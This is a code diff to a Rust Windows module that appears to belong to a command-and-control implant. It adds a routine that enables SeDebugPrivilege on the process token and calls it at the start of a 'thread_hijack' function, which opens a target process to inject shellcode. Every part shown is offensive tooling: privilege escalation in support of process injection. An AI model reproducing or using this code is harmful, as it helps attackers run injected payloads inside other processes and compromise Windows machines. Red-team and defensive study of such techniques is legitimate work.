@@ -5,7 +5,7 @@ use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_
 use windows_sys::Win32::System::Threading::{
     OpenProcess, OpenThread, SuspendThread, ResumeThread, WaitForSingleObject,
     OpenProcessToken, CreateProcessW, CreateProcessWithTokenW,
-    SetProcessMitigationPolicy, ProcessSignaturePolicy,
+    SetProcessMitigationPolicy, ProcessSignaturePolicy, GetCurrentProcess,
     PROCESS_ALL_ACCESS, PROCESS_QUERY_INFORMATION, THREAD_ALL_ACCESS, CREATE_SUSPENDED,
     STARTUPINFOW, PROCESS_INFORMATION,
 };
@@ -24,7 +24,11 @@ use windows_sys::Win32::System::Diagnostics::ToolHelp::{
 use windows_sys::Win32::Security::{
     DuplicateTokenEx, SecurityImpersonation, TokenPrimary,
     TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
+    AdjustTokenPrivileges, LookupPrivilegeValueW,
+    TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, SE_PRIVILEGE_ENABLED,
+    TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES,
 };
+use windows_sys::Win32::Foundation::LUID;
 use crate::transport::{AgentTransport, TaskWire};
 
 fn wide(s: &str) -> Vec<u16> {
@@ -35,9 +39,26 @@ fn shell(cmd: &str) -> String {
     super::shell(cmd)
 }
 
+unsafe fn try_sedebug() {
+    let mut htok: HANDLE = 0;
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htok) != 0 {
+        let name = wide("SeDebugPrivilege");
+        let mut luid: LUID = std::mem::zeroed();
+        LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid);
+        let tp = TOKEN_PRIVILEGES {
+            PrivilegeCount: 1,
+            Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
+        };
+        AdjustTokenPrivileges(htok, 0, &tp, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
+            std::ptr::null_mut(), std::ptr::null_mut());
+        CloseHandle(htok);
+    }
+}
+
 // ── THREAD_HIJACK ─────────────────────────────────────────────────────────────
 
 unsafe fn thread_hijack(pid: u32, sc: &[u8]) -> String {
+    try_sedebug();
     // Open target process and allocate RW memory for the shellcode.
     let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
     if hproc == 0 {
